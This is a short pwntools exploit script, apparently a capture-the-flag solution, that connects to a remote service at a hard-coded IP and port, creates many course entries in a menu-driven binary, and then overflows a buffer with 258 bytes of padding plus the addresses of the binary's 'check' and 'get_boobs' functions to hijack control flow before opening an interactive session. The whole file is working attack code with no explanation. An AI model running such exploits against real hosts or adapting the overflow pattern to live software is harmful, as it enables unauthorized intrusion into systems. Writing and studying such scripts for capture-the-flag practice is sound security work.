from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

bin = ELF("./boobs")

#conn = process("./boobs")
#gdb.attach(conn)
conn = remote("34.242.96.216", 22222)

def menu(choice):
#    conn.recvuntil("classroom")
    conn.sendline(str(choice))

def create(course, title, content):
    menu(1)
    #conn.recvuntil("Enter course number")
    conn.sendline(str(course))
#    conn.recvuntil("Adding new course")
    conn.sendline(title)
    #conn.recvuntil("course content")
    conn.sendline(content)

def edit(course, content):
    menu(1)
    #conn.recvuntil("Enter course number")
    conn.sendline(str(course))
#    conn.recvuntil("course text")
    conn.sendline(content)

def publish():
    menu(3)

#conn.recvuntil("new classroom:")
conn.sendline("vampire")

for i in range(1, 80):
    create(i, "a", "b")

create(80, "a", "b")
payload = "a"*258 + p32(bin.symbols['check'])
edit(80, payload)
create(81, "a", "b")
payload = "a"*258 + p32(bin.symbols['get_boobs'])
edit(81, payload)

publish()

conn.interactive()
